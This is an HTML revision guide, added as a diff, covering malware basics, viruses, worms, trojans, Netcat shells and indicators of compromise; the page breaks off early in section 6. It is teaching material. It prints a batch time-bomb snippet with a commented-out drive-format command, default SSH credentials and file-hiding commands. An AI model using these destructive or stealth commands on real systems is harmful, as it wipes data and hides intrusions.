@@ -1,0 +1,1614 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Week 8 Revision — Malware Intro &amp; System Security</title>
+<style>
+  :root{
+    --bg:#0b0f14;
+    --panel:#121821;
+    --panel2:#182130;
+    --border:#26303f;
+    --text:#d8e0ea;
+    --muted:#8b9ab0;
+    --accent:#4da3ff;
+    --green:#7ee787;
+    --red:#ff6b6b;
+    --amber:#ffb454;
+    --purple:#b48cff;
+    --cyan:#4dd0e1;
+  }
+  *{box-sizing:border-box;}
+  html{scroll-behavior:smooth;}
+  body{
+    margin:0;
+    background:
+      radial-gradient(1200px 600px at 80% -10%, #16233a 0%, transparent 60%),
+      radial-gradient(900px 500px at 0% 20%, #1a1526 0%, transparent 55%),
+      var(--bg);
+    color:var(--text);
+    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+    font-size:15.5px;
+    line-height:1.65;
+    -webkit-font-smoothing:antialiased;
+  }
+  code,pre,.mono{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,"Liberation Mono",monospace;}
+
+  /* ---------- top bar ---------- */
+  .topbar{
+    padding:34px 40px 26px;
+    border-bottom:1px solid var(--border);
+    background:linear-gradient(180deg, rgba(77,163,255,.08), transparent);
+  }
+  .topbar h1{
+    margin:0 0 6px;
+    font-size:clamp(1.4rem,2.6vw,2rem);
+    letter-spacing:-.5px;
+    background:linear-gradient(90deg,#8fc7ff,#b48cff 55%,#7ee787);
+    -webkit-background-clip:text;background-clip:text;color:transparent;
+  }
+  .topbar p{margin:0;color:var(--muted);font-size:.92rem;}
+
+  /* ---------- layout ---------- */
+  .layout{display:flex;align-items:flex-start;}
+  .sidebar{
+    position:sticky;top:0;height:100vh;width:272px;flex:0 0 272px;
+    overflow-y:auto;padding:22px 14px 60px;
+    border-right:1px solid var(--border);
+    background:rgba(8,12,18,.7);
+    backdrop-filter:blur(6px);
+  }
+  .sidebar h3{
+    font-size:.72rem;letter-spacing:.14em;text-transform:uppercase;
+    color:var(--muted);margin:0 0 12px 10px;font-weight:600;
+  }
+  .sidebar a{
+    display:block;padding:7px 12px;border-radius:8px;
+    color:var(--muted);text-decoration:none;font-size:.875rem;
+    border-left:2px solid transparent;transition:.15s;
+  }
+  .sidebar a:hover{background:var(--panel2);color:var(--text);}
+  .sidebar a.active{background:rgba(77,163,255,.13);color:#9ecbff;border-left-color:var(--accent);}
+
+  main{flex:1 1 auto;min-width:0;padding:36px 44px 160px;max-width:1080px;}
+
+  /* ---------- sections ---------- */
+  section{margin-bottom:64px;scroll-margin-top:24px;}
+  section > h2{
+    font-size:1.42rem;margin:0 0 6px;letter-spacing:-.3px;
+    padding-left:14px;border-left:4px solid var(--accent);
+  }
+  section > .lede{color:var(--muted);margin:0 0 22px 14px;font-size:.93rem;}
+  h3{font-size:1.06rem;margin:30px 0 10px;color:#bcd3ee;}
+  h4{font-size:.95rem;margin:18px 0 6px;color:#9fb6d1;}
+  p{margin:10px 0;}
+  ul,ol{margin:10px 0;padding-left:22px;}
+  li{margin:5px 0;}
+  strong{color:#fff;font-weight:600;}
+  em{color:#a9c8ea;font-style:normal;}
+
+  /* ---------- cards ---------- */
+  .card{
+    background:var(--panel);border:1px solid var(--border);
+    border-radius:12px;padding:18px 20px;margin:16px 0;
+  }
+  .card.accent{border-left:3px solid var(--accent);}
+  .card.warn{border-left:3px solid var(--amber);background:rgba(255,180,84,.06);}
+  .card.danger{border-left:3px solid var(--red);background:rgba(255,107,107,.06);}
+  .card.good{border-left:3px solid var(--green);background:rgba(126,231,135,.05);}
+  .card h4{margin-top:0;}
+
+  .grid2{display:grid;grid-template-columns:1fr 1fr;gap:14px;}
+  @media(max-width:820px){.grid2{grid-template-columns:1fr;}}
+
+  /* ---------- tables ---------- */
+  .tblwrap{overflow-x:auto;margin:16px 0;border:1px solid var(--border);border-radius:10px;}
+  table{border-collapse:collapse;width:100%;font-size:.875rem;min-width:520px;}
+  th,td{padding:10px 13px;text-align:left;border-bottom:1px solid var(--border);vertical-align:top;}
+  th{background:var(--panel2);color:#a9c8ea;font-weight:600;font-size:.78rem;
+     letter-spacing:.05em;text-transform:uppercase;}
+  tr:last-child td{border-bottom:none;}
+  td code{background:#0a0f16;padding:1px 5px;border-radius:4px;font-size:.82rem;color:#8fc7ff;}
+
+  /* ---------- code ---------- */
+  pre.code{
+    background:#080c12;border:1px solid var(--border);border-radius:10px;
+    padding:14px 16px;overflow-x:auto;font-size:.83rem;line-height:1.55;
+    margin:14px 0;color:#c8d6e8;
+  }
+  pre.code .cm{color:#5d6e85;}
+  .cm{color:#5d6e85;}
+  code.inl{background:#080c12;border:1px solid var(--border);padding:1px 6px;border-radius:5px;font-size:.84rem;color:#8fc7ff;}
+
+  /* ---------- chips / buttons ---------- */
+  .chip{
+    background:var(--panel2);border:1px solid var(--border);color:var(--muted);
+    padding:6px 12px;border-radius:999px;font-size:.79rem;cursor:pointer;
+    transition:.15s;font-family:inherit;margin:0;
+  }
+  .chip:hover{color:var(--text);border-color:#3c4c62;}
+  .chip.active{background:rgba(77,163,255,.18);border-color:var(--accent);color:#bfe0ff;}
+  .btn{
+    background:linear-gradient(180deg,#1e3category,#152033);
+    background:linear-gradient(180deg,#22304a,#16202f);
+    border:1px solid #33455e;color:#cfe2f8;padding:8px 16px;border-radius:8px;
+    cursor:pointer;font-size:.84rem;font-family:inherit;transition:.15s;
+  }
+  .btn:hover{border-color:var(--accent);color:#fff;}
+  .btn.primary{background:linear-gradient(180deg,#1f5fa8,#14406f);border-color:#2f7fd0;color:#eaf4ff;}
+  .btn.primary:hover{background:linear-gradient(180deg,#2470c4,#17508a);}
+  .btnrow{display:flex;flex-wrap:wrap;gap:8px;margin:12px 0;}
+
+  /* ---------- virus insertion visualizer ---------- */
+  .viz{
+    background:var(--panel);border:1px solid var(--border);border-radius:12px;
+    padding:18px;margin:18px 0;
+  }
+  #insertion-btns{display:flex;flex-wrap:wrap;gap:7px;margin-bottom:16px;}
+  .file-stack{
+    display:flex;flex-direction:column;gap:3px;
+    border:2px solid #33455e;border-radius:9px;padding:5px;background:#0a1018;
+    min-height:180px;justify-content:flex-start;
+  }
+  .seg{
+    border-radius:6px;padding:11px 14px;font-size:.79rem;font-weight:600;
+    letter-spacing:.03em;display:flex;align-items:center;justify-content:center;
+    text-align:center;min-height:44px;transition:.25s;
+  }
+  .seg--host{background:linear-gradient(180deg,#183a5c,#122a44);border:1px solid #2f6ea3;color:#9fd0ff;}
+  .seg--virus{background:linear-gradient(180deg,#5c1a1a,#3d1111);border:1px solid #a33a3a;color:#ffb3b3;}
+  .viz-desc{
+    margin-top:14px;padding:12px 14px;border-radius:9px;background:#0c121b;
+    border:1px solid var(--border);font-size:.86rem;color:#b8c9de;min-height:66px;
+  }
+
+  /* ---------- netcat ---------- */
+  .nc-stage{
+    display:grid;grid-template-columns:1fr 100px 1fr;gap:10px;align-items:center;
+    margin:16px 0 10px;
+  }
+  @media(max-width:700px){.nc-stage{grid-template-columns:1fr;}}
+  .nc-node{
+    background:#0a1018;border:1px solid #2c3c50;border-radius:10px;padding:12px;
+    min-height:130px;
+  }
+  .nc-node h4{margin:0 0 8px;font-size:.8rem;letter-spacing:.08em;text-transform:uppercase;color:var(--muted);}
+  .nc-node pre{background:transparent;border:none;padding:0;margin:0;font-size:.76rem;
+    line-height:1.5;overflow-x:auto;color:#c8d6e8;}
+  .nc-node.atk{border-color:#7a3d3d;}
+  .nc-node.atk h4{color:#ff9b9b;}
+  .nc-node.vic{border-color:#3d5f7a;}
+  .nc-node.vic h4{color:#9bc9ff;}
+  .nc-link{position:relative;height:2px;background:#2c3c50;border-radius:2px;}
+  .nc-link .packet{
+    position:absolute;top:-5px;left:0;width:12px;height:12px;border-radius:50%;
+    background:var(--green);box-shadow:0 0 12px var(--green);
+    animation:slide 1.7s linear infinite;
+  }
+  .nc-link.rev .packet{animation-direction:reverse;background:var(--amber);box-shadow:0 0 12px var(--amber);}
+  @keyframes slide{from{left:0;}to{left:calc(100% - 12px);}}
+
+  /* ---------- worm grid ---------- */
+  .worm-grid{
+    display:grid;grid-template-columns:repeat(12,1fr);gap:4px;max-width:440px;
+    margin:14px 0;background:#0a1018;padding:8px;border-radius:10px;border:1px solid var(--border);
+  }
+  .worm-cell{
+    aspect-ratio:1;border-radius:3px;background:#1a2330;transition:background .35s, box-shadow .35s;
+  }
+  .worm-cell.inf{background:var(--red);box-shadow:0 0 8px rgba(255,107,107,.7);}
+  .worm-cell.src{background:var(--amber);box-shadow:0 0 12px rgba(255,180,84,.9);}
+
+  /* ---------- spectre ---------- */
+  .arr1{display:flex;gap:4px;flex-wrap:wrap;margin:8px 0;}
+  .arr1 .cell1{
+    width:30px;height:30px;border-radius:5px;background:#1a2330;border:1px solid #2c3c50;
+    display:flex;align-items:center;justify-content:center;font-size:.66rem;color:#5d6e85;
+    transition:.25s;
+  }
+  .arr1 .cell1.oob{background:#3a1f1f;border-color:#a33a3a;color:#ffb3b3;}
+  .arr1 .cell1.target{background:#7a2020;border-color:#ff6b6b;color:#fff;box-shadow:0 0 14px rgba(255,107,107,.6);}
+  .arr2{display:grid;grid-template-columns:repeat(32,1fr);gap:2px;max-width:430px;margin:8px 0;}
+  .arr2 .cell2{aspect-ratio:1;border-radius:2px;background:#16202c;transition:.2s;}
+  .arr2 .cell2.scan{background:#243447;}
+  .arr2 .cell2.hot{background:var(--green);box-shadow:0 0 10px rgba(126,231,135,.9);}
+  .spectre-console{
+    background:#080c12;border:1px solid var(--border);border-radius:9px;padding:12px 14px;
+    font-family:ui-monospace,Menlo,Consolas,monospace;font-size:.79rem;color:#9fd0ff;
+    min-height:70px;margin-top:12px;white-space:pre-wrap;
+  }
+
+  /* ---------- rings ---------- */
+  .rings-wrap{display:flex;gap:24px;align-items:center;flex-wrap:wrap;margin:14px 0;}
+  .rings{width:300px;height:300px;flex:0 0 auto;}
+  .ring0{fill:#2a1220;stroke:#ff6b6b;stroke-width:2;}
+  .ring1{fill:#221a10;stroke:#ffb454;stroke-width:2;}
+  .ring3{fill:#101c2a;stroke:#4da3ff;stroke-width:2;}
+  .ring-text{fill:#c8d6e8;font-size:13px;font-family:ui-monospace,monospace;text-anchor:middle;}
+  .ring-sub{fill:#8b9ab0;font-size:10px;font-family:ui-monospace,monospace;text-anchor:middle;}
+  #escalate-dot{fill:#7ee787;transition:transform 1s cubic-bezier(.4,0,.2,1);}
+
+  /* ---------- hypervisor ---------- */
+  .hv-stack{display:flex;flex-direction:column;gap:5px;margin:14px 0;max-width:560px;}
+  .hv-layer{
+    padding:13px;border-radius:8px;text-align:center;font-size:.83rem;font-weight:600;
+    border:1px solid;transition:.3s;
+  }
+  .hv-guest{background:#12233a;border-color:#2f6ea3;color:#9fd0ff;}
+  .hv-hyp{background:#3a1f2e;border-color:#a34a7a;color:#ffb3d9;}
+  .hv-host{background:#1d2a1d;border-color:#4a8c4a;color:#b3ffb3;}
+  .hv-hw{background:#242430;border-color:#4a4a6a;color:#c0c0e0;}
+
+  /* ---------- command injection ---------- */
+  .ci-box{background:var(--panel);border:1px solid var(--border);border-radius:12px;padding:18px;margin:16px 0;}
+  .ci-box input[type=text]{
+    width:100%;background:#080c12;border:1px solid #33455e;border-radius:8px;
+    padding:10px 13px;color:#c8d6e8;font-family:ui-monospace,Menlo,monospace;font-size:.86rem;
+    outline:none;transition:.15s;
+  }
+  .ci-box input[type=text]:focus{border-color:var(--accent);box-shadow:0 0 0 3px rgba(77,163,255,.13);}
+  .ci-out{margin-top:14px;font-family:ui-monospace,Menlo,monospace;font-size:.82rem;line-height:1.8;}
+  .ci-line{background:#080c12;border:1px solid var(--border);border-radius:7px;padding:9px 12px;margin:6px 0;overflow-x:auto;}
+  .ci-ok{color:#9fd0ff;}
+  .ci-danger{color:#ff8a8a;}
+  .ci-meta{color:#ffb454;font-weight:700;}
+  .ci-safe{color:#7ee787;}
+
+  /* ---------- terminal ---------- */
+  .terminal{
+    background:#05080c;border:1px solid var(--border);border-radius:9px;
+    padding:14px 16px;font-family:ui-monospace,Menlo,monospace;font-size:.8rem;
+    color:#c8d6e8;line-height:1.7;margin:12px 0;overflow-x:auto;min-height:120px;
+  }
+  .terminal .prompt{color:#7ee787;}
+  .terminal .hidden-file{color:#ff8a8a;}
+
+  /* ---------- quiz ---------- */
+  .quiz-item{background:var(--panel);border:1px solid var(--border);border-radius:12px;
+    padding:16px 18px;margin:14px 0;}
+  .quiz-item .q{font-weight:600;margin-bottom:10px;color:#e2ecf8;}
+  .opt{
+    display:block;width:100%;text-align:left;background:#0d141d;border:1px solid #26303f;
+    color:#b8c9de;padding:9px 13px;border-radius:8px;margin:6px 0;cursor:pointer;
+    font-family:inherit;font-size:.86rem;transition:.15s;
+  }
+  .opt:hover{border-color:#3c4c62;background:#111a25;}
+  .opt.correct{background:rgba(126,231,135,.14);border-color:var(--green);color:#b7f5bd;}
+  .opt.wrong{background:rgba(255,107,107,.12);border-color:var(--red);color:#ffb3b3;}
+  .explain{display:none;margin-top:10px;padding:10px 13px;border-radius:8px;
+    background:#0c121b;border-left:3px solid var(--accent);font-size:.84rem;color:#a9c8ea;}
+  .explain.show{display:block;}
+  .score{font-size:.9rem;color:var(--muted);margin-top:10px;}
+
+  /* ---------- misc ---------- */
+  .pill{display:inline-block;padding:2px 9px;border-radius:999px;font-size:.72rem;
+    font-weight:600;letter-spacing:.04em;text-transform:uppercase;margin-right:6px;}
+  .pill.red{background:rgba(255,107,107,.15);color:#ff9b9b;border:1px solid #7a3d3d;}
+  .pill.blue{background:rgba(77,163,255,.15);color:#9ecbff;border:1px solid #2f6ea3;}
+  .pill.green{background:rgba(126,231,135,.13);color:#a8f0ae;border:1px solid #3d7a3d;}
+  .pill.amber{background:rgba(255,180,84,.13);color:#ffcf94;border:1px solid #7a5c2f;}
+  .pill.purple{background:rgba(180,140,255,.14);color:#d0bcff;border:1px solid #5f4a8a;}
+
+  @media(max-width:900px){
+    .layout{display:block;}
+    .sidebar{position:static;height:auto;width:auto;flex:none;border-right:none;
+      border-bottom:1px solid var(--border);padding-bottom:18px;}
+    main{padding:26px 20px 100px;}
+    .topbar{padding:24px 20px 18px;}
+  }
+</style>
+</head>
+<body>
+
+<div class="topbar">
+  <h1>Week 8 — Malware Intro &amp; System Security</h1>
+  <p>Interactive revision guide · 12 topic areas · illustrations, demos &amp; self-test</p>
+</div>
+
+<div class="layout">
+  <nav class="sidebar" id="sidebar">
+    <h3>Contents</h3>
+    <a href="#s1">1 · Malware Foundations</a>
+    <a href="#s2">2 · Viruses</a>
+    <a href="#s3">3 · Worms</a>
+    <a href="#s4">4 · Trojans &amp; Netcat</a>
+    <a href="#s5">5 · Stealth &amp; IoCs</a>
+    <a href="#s6">6 · System Architecture</a>
+    <a href="#s7">7 · Hardware Attacks</a>
+    <a href="#s8">8 · Software Attacks</a>
+    <a href="#s9">9 · Hypervisors</a>
+    <a href="#s10">10 · OS Kernel</a>
+    <a href="#s11">11 · System Software</a>
+    <a href="#s12">12 · Summary &amp; Quiz</a>
+  </nav>
+
+  <main>
+
+  <!-- ============================ 1 ============================ -->
+  <section id="s1">
+    <h2>1 · Fundamentals of Malicious Software</h2>
+    <p class="lede">What malware is, why it targets specific platforms, and the four dimensions of organisational impact.</p>
+
+    <div class="card accent">
+      <h4>Core definition</h4>
+      <p><strong>Malware</strong> is any software program intentionally engineered to <em>intrude into a system without user authorisation</em>, degrade system performance, alter stored data, or disrupt service availability.</p>
+    </div>
+
+    <h3>1.1 Platform dependence</h3>
+    <ul>
+      <li><strong>OS-specific targeting</strong> — malware often relies on detailed operational knowledge of a host OS: default configurations, file permission models (Unix permissions), or privilege structures (Windows admin rights).</li>
+      <li><strong>Cross-platform malware</strong> — compiled to run on multiple operating systems by abusing platform-agnostic execution environments such as the Java Virtual Machine.</li>
+    </ul>
+
+    <div class="card">
+      <h4><span class="pill red">Slide example</span> Adwind — cross-platform Java Trojan</h4>
+      <p>Adwind is written in Java and therefore runs anywhere a JVM exists. On macOS it achieves <strong>persistence</strong> by:</p>
+      <ul>
+        <li>Dropping a Java applet named <code class="inl">BgHSYtccjkN.ELbrtQ</code> inside a <strong>dot-prefixed hidden directory</strong> in the user's home folder (<code class="inl">~/.UQnxIJkKPii/…</code>). Dot-prefixed paths are hidden from Finder by default.</li>
+        <li>Registering an XML Property List (<code class="inl">.plist</code>) launch agent containing <code class="inl">&lt;key&gt;RunAtLoad&lt;/key&gt;&lt;true/&gt;</code>, so the payload auto-runs at system boot.</li>
+      </ul>
+    </div>
+
+    <h3>1.2 Impact taxonomy — four organisational dimensions</h3>
+    <div class="tblwrap">
+      <table>
+        <thead><tr><th>Impact dimension</th><th>Mechanism &amp; consequences</th><th>Concrete example</th></tr></thead>
+        <tbody>
+          <tr><td><strong>Data</strong></td><td>Unauthorised alteration, deletion, encryption or exfiltration of sensitive files.</td><td>Harvesting stored user credentials; modifying confidential database entries.</td></tr>
+          <tr><td><strong>Time</strong></td><td>Rendering core system functionality unusable; operational downtime until cleanup.</td><td>System crashes or resource exhaustion stopping legitimate users from working.</td></tr>
+          <tr><td><strong>Hardware</strong></td><td>Indirect physical or functional damage by corrupting low-level system software.</td><td>Corrupting device drivers or device firmware, disabling hardware components.</td></tr>
+          <tr><td><strong>Reputation</strong></td><td>Loss of commercial confidence, public embarrassment, direct financial damage.</td><td>Exfiltrating private corporate emails or customer records and leaking them publicly.</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </section>
+
+  <!-- ============================ 2 ============================ -->
+  <section id="s2">
+    <h2>2 · Viruses — Mutation, Insertion &amp; Anatomy</h2>
+    <p class="lede">Viruses are the only major malware class that fundamentally requires a human being to press the button.</p>
+
+    <h3>2.1 Core characteristics</h3>
+    <div class="grid2">
+      <div class="card">
+        <h4>Human interaction required</h4>
+        <p>A virus <strong>cannot self-replicate automatically</strong> across networks. It spreads only when a user executes an infected file, opens an infected script, or plugs in infected media.</p>
+      </div>
+      <div class="card">
+        <h4>Host program attachment</h4>
+        <p>Viruses attach to legitimate host files or shell scripts. Supported hosts include Windows <code class="inl">.exe</code> binaries, Unix shell scripts (<code class="inl">.sh</code>), and Windows batch files (<code class="inl">.bat</code>).</p>
+      </div>
+      <div class="card">
+        <h4>Infection flags / markers</h4>
+        <p>After infecting a file, the virus writes a unique marker into the host header or binary structure, signalling "already compromised" and preventing infinite reinfection loops.</p>
+      </div>
+      <div class="card">
+        <h4>Why mutation matters</h4>
+        <p>Signature-based antivirus matches byte patterns. If the bytes change on every infection, the signature library is always one step behind.</p>
+      </div>
+    </div>
+
+    <div class="tblwrap">
+      <table>
+        <thead><tr><th>Variant</th><th>Mechanism</th><th>Effect on AV</th></tr></thead>
+        <tbody>
+          <tr>
+            <td><strong>Metamorphic</strong><br><span class="pill amber">mutating</span></td>
+            <td>Alters its underlying code structure, instruction sequences and binary appearance on every infection cycle, while keeping the functional payload intact.</td>
+            <td>No stable byte signature to match — the file looks different each time.</td>
+          </tr>
+          <tr>
+            <td><strong>Polymorphic</strong><br><span class="pill purple">encrypted</span></td>
+            <td>Encrypts its main payload with a <em>unique key per infection</em> and pairs it with a varying decryption routine.</td>
+            <td>The ciphertext changes; only the decryption stub may stay recognisable.</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+
+    <h3>2.2 Virus insertion mechanics — interactive</h3>
+    <p>Click each technique to see how the virus lays itself out inside (or beside) the host file.</p>
+
+    <div class="viz">
+      <div id="insertion-btns"></div>
+      <div class="file-stack" id="file-stack"></div>
+      <div class="viz-desc" id="insertion-desc"></div>
+    </div>
+
+    <div class="card warn">
+      <h4>Why "Companion" is sneaky</h4>
+      <p>The host binary is <strong>completely unmodified</strong> — its hash, size and signature all still look clean. The virus simply creates a second executable with the same base name or a higher-priority extension (e.g. <code class="inl">prog.com</code> alongside <code class="inl">prog.exe</code>), and Windows executes the <code class="inl">.com</code> first.</p>
+    </div>
+
+    <h3>2.3 Virus anatomy — three functional code segments</h3>
+    <div class="grid2">
+      <div class="card"><h4>1 · Concealment</h4><p>Routines engineered to bypass security controls, obscure code signatures, and hide from antivirus scanners.</p></div>
+      <div class="card"><h4>2 · Propagation</h4><p>Routines that scan host storage, identify uninfected candidate files, and place infection markers.</p></div>
+    </div>
+    <div class="card"><h4>3 · Payload</h4><p>Non-propagation code designed to execute the malicious action — corrupting storage, exfiltrating data, etc. The payload is often dormant until a trigger fires.</p></div>
+
+    <h3>2.4 Activation triggers</h3>
+    <div class="grid2">
+      <div class="card">
+        <h4>Logic bomb</h4>
+        <p>Payload executes when a <strong>specific system event or condition</strong> occurs — e.g. an administrator account being deleted, a particular file appearing, or a certain user logging in.</p>
+      </div>
+      <div class="card">
+        <h4>Time bomb</h4>
+        <p>Payload executes when the <strong>system clock</strong> reaches a specific date or time.</p>
+      </div>
+    </div>
+
+    <p><strong>Slide example — Windows batch-script time bomb:</strong></p>
+<pre class="code">If "%date%" NEQ "Thu 01/09/2016" goto exit
+REM format E: /y &gt;nul
+echo "Hello World!"
+:exit</pre>
+    <p>On every run the script compares the system date. If it is <em>not</em> 1 September 2016, it jumps straight to <code class="inl">:exit</code>. Once the date matches, control falls through to the destructive line and reformats drive <code class="inl">E:</code> — silently, because output is redirected to <code class="inl">nul</code>.</p>
+  </section>
+
+  <!-- ============================ 3 ============================ -->
+  <section id="s3">
+    <h2>3 · Worms — Autonomous Propagation</h2>
+    <p class="lede">A worm is malware that needs <em>no human</em> and <em>no host file</em> — it is a self-driving network threat.</p>
+
+    <h3>3.1 Core characteristics</h3>
+    <ul>
+      <li><strong>Autonomous replication</strong> — no human interaction, no host document to attach to. The worm actively scans networks, exploits unpatched services and self-replicates.</li>
+      <li><strong>Carrier &amp; payload</strong> — the worm is often just the delivery vehicle; it drops secondary attack tools, backdoors or botnet clients onto each victim.</li>
+    </ul>
+
+    <h4>Primary propagation mechanisms</h4>
+    <div class="tblwrap">
+      <table>
+        <thead><tr><th>Vector</th><th>How it works</th></tr></thead>
+        <tbody>
+          <tr><td><strong>Windows administrative shares</strong></td><td>Spreads over SMB by leveraging open admin shares (<code>net share</code>).</td></tr>
+          <tr><td><strong>Unix remote shell scripts</strong></td><td>Executes commands across remote Unix systems via legacy protocols such as <code>rsh</code>.</td></tr>
+          <tr><td><strong>Networking software vulnerabilities</strong></td><td>Exploits flaws in network services — e.g. Stuxnet abused the print spooler.</td></tr>
+          <tr><td><strong>Password cracking</strong></td><td>Automated brute-forcing of weak SSH / administrative credentials — the Morris Worm did exactly this.</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <h3>3.2 Historical milestones</h3>
+    <div class="tblwrap">
+      <table>
+        <thead><tr><th>Worm</th><th>Year</th><th>Significance</th></tr></thead>
+        <tbody>
+          <tr><td><strong>Morris Worm</strong></td><td>1988</td><td>Earliest recognised internet worm; propagated via <code>rsh</code>, network bugs and automated password cracking.</td></tr>
+          <tr><td><strong>Blaster</strong></td><td>2003</td><td>Targeted Microsoft RPC buffer overflow vulnerabilities.</td></tr>
+          <tr><td><strong>Conficker</strong></td><td>2008</td><td>Built massive global botnets by exploiting SMB weaknesses.</td></tr>
+          <tr><td><strong>Stuxnet</strong></td><td>2010</td><td>Cyber-weapon using Windows zero-days and print-spooler flaws to reach industrial control systems.</td></tr>
+          <tr><td><strong>SMB Worm Tool</strong></td><td>Dec 2014</td><td>Automated exploitation tool targeting SMB protocols.</td></tr>
+          <tr><td><strong>EternalRocks</strong></td><td>2017–18</td><td>Multi-exploit SMB worm; silently infects and drops persistent backdoors for future C2 operations.</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <h3>3.3 Case study — Ikee / Duh (<code class="inl">Ikee.B</code>) smartphone worm</h3>
+    <div class="card danger">
+      <ul>
+        <li><strong>Target:</strong> jailbroken iPhones running iOS with default <em>OpenSSH</em> installed.</li>
+        <li><strong>Infection:</strong> scanned IP ranges for port 22 open, logged in with the <strong>default credentials</strong> <code class="inl">root</code> / <code class="inl">alpine</code>, then changed the SSH password to lock the real owner out.</li>
+        <li><strong>C2:</strong> recruited victims into a mobile botnet controlled from a command centre in <strong>Lithuania</strong>.</li>
+        <li><strong>Payload:</strong> exfiltrated contacts, SMS messages and financial data to an external attacker database.</li>
+      </ul>
+      <p style="margin-bottom:0"><em>Lesson:</em> a worm needs no user action — only a reachable service and a default credential.</p>
+    </div>
+
+    <h3>3.4 Worm propagation simulator</h3>
+    <p>Press start and watch infection spread with no user interaction whatsoever — each infected node automatically probes its neighbours.</p>
+    <div class="worm-grid" id="worm-grid"></div>
+    <div class="btnrow">
+      <button class="btn primary" id="worm-start">Start propagation</button>
+      <button class="btn" id="worm-reset">Reset</button>
+      <span id="worm-stat" class="mono" style="align-self:center;color:#8b9ab0;font-size:.85rem;">infected: 1 / 144</span>
+    </div>
+  </section>
+
+  <!-- ============================ 4 ============================ -->
+  <section id="s4">
+    <h2>4 · Trojans, Keyloggers, Backdoors &amp; Netcat</h2>
+    <p class="lede">Trojans earn initial access by deception; the backdoor they install keeps it.</p>
+
+    <div class="grid2">
+      <div class="card">
+        <h4>Trojan horse</h4>
+        <p>A program disguised inside seemingly harmless software (a fake utility, a "free" game crack). Trojans <strong>do not self-replicate</strong>. They establish backdoors, install RATs and keyloggers, and can grant remote webcam and system control.</p>
+      </div>
+      <div class="card">
+        <h4>Keylogger</h4>
+        <p>Surveillance software that intercepts and records physical keystrokes. Harvests plaintext passwords, login credentials, private emails, credit card numbers and financial details. Slide tool: <em>Spyrix Free Keylogger</em>.</p>
+      </div>
+    </div>
+
+    <div class="card warn">
+      <h4>Backdoors &amp; RATs</h4>
+      <p>Remote administration utilities configured for <strong>persistent, unauthorised access</strong> — examples include <strong>Netcat (<code class="inl">nc</code>)</strong> and <strong>ProRAT</strong>. Note that Netcat is explicitly flagged as a malicious binary by standard AV and by university IT policy (CIT): it is a legitimate tool that is overwhelmingly used illegitimately in this context.</p>
+    </div>
+
+    <h3>4.1 Netcat operational modes — interactive</h3>
+    <p>Select a mode to see the exact command on each side and the direction of the connection.</p>
+
+    <div class="card">
+      <div class="btnrow" id="nc-btns"></div>
+      <div class="nc-stage">
+        <div class="nc-node atk"><h4>Attacker</h4><pre id="nc-attacker"></pre></div>
+        <div class="nc-link" id="nc-link"><div class="packet"></div></div>
+        <div class="nc-node vic"><h4>Victim</h4><pre id="nc-victim"></pre></div>
+      </div>
+      <div class="viz-desc" id="nc-note"></div>
+    </div>
+
+    <div class="card good">
+      <h4>Exam-friendly contrast</h4>
+      <p><strong>Bind shell</strong> = victim listens, attacker dials in → <em>blocked by inbound firewall rules.</em><br>
+         <strong>Reverse shell</strong> = attacker listens, victim dials out → <em>looks like normal outbound traffic and bypasses inbound firewall rules.</em></p>
+    </div>
+  </section>
+
+  <!-- ============================ 5 ============================ -->
+  <section id="s5">
+    <h2>5 · Stealth Techniques &amp; Indicators of Compromise</h2>
+    <p class="lede">Attackers hide artefacts using built-in OS features; defenders look for anomalies that hiding cannot remove.</p>
+
+    <h3>5.1 Hiding files on Windows</h3>
+    <div class="grid2">
+      <div class="card">
+        <h4>GUI method</h4>
+        <p class="mono" style="font-size:.82rem;color:#9fd0ff;line-height:2;">
+          Explorer → Computer → Organize<br>
+          → Folder and search options<br>
+          → View tab
+        </p>
+        <p>Then select <em>“Don't show hidden files, folders, or drives”</em> and tick <em>“Hide protected operating system files (Recommended)”</em>.</p>
+      </div>
+      <div class="card">
+        <h4>Command-line method</h4>
+        <pre class="code" style="margin-top:6px">attrib +s +a +h &lt;folder/filename&gt;</pre>
+        <p>Applies the <strong>System</strong> (<code class="inl">+s</code>), <strong>Archive</strong> (<code class="inl">+a</code>) and <strong>Hidden</strong> (<code class="inl">+h</code>) flags simultaneously, rendering the item invisible to a default <code class="inl">dir</code> listing.</p>
+      </div>
+    </div>
+
+    <h4>Try it — toggle the attributes and watch the directory listing</h4>
+    <div class="card">
+      <div class="btnrow">
+        <button class="btn primary" id="attrib-btn">attrib +s +a +h secret_folder</button>
+        <button class="btn" id="attrib-reset">dir /a (show everything)</button>
+      </div>
+      <div class="terminal" id="attrib-out"></div>
+    </div>
+
+    <h3>5.2 Indicators of Compromise (IoCs)</h3>
+    <p>Seven primary signs that defenders monitor:</p>
+    <div class="tblwrap">
+      <table>
+        <thead><tr><th>#</th><th>Indicator</th><th>What it suggests</th></tr></thead>
+        <tbody>
+          <tr><td>1</td><td><strong>System slowdowns</strong></td><td>Programs take significantly longer to launch or complete standard tasks.</td></tr>
+          <tr><td>2</td><td><strong>Memory drops</strong></td><td>Sudden, unprovoked drop in available system RAM.</td></tr>
+          <tr><td>3</td><td><strong>Executable file size changes</strong></td><td>Unexpected binary length changes from virus appending / prepending.</td></tr>
+          <tr><td>4</td><td><strong>Timestamp anomalies</strong></td><td>Very old system files suddenly showing recent modification times.</td></tr>
+          <tr><td>5</td><td><strong>Unprovoked reboots</strong></td><td>System restarts spontaneously with no user initiation.</td></tr>
+          <tr><td>6</td><td><strong>Heavy network traffic</strong></td><td>High outbound volume while the endpoint is idle (exfiltration / C2 beaconing).</td></tr>
+          <tr><td>7</td><td><strong>Input discrepancies</strong></td><td>Keys typed on the keyboard do not match characters on screen.</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </section>
+
+  <!-- ============================ 6 ============================ -->
+  <section id="s6">
+    <h2>6 · System Architecture &amp; Cross-Layer Threat Model</h2>
+    <p class="lede">Security vulnerabilities routinely cross structural layer boundaries.</p>
+
+    <div class="card accent">
+      <h4>Von Neumann architecture</h4>
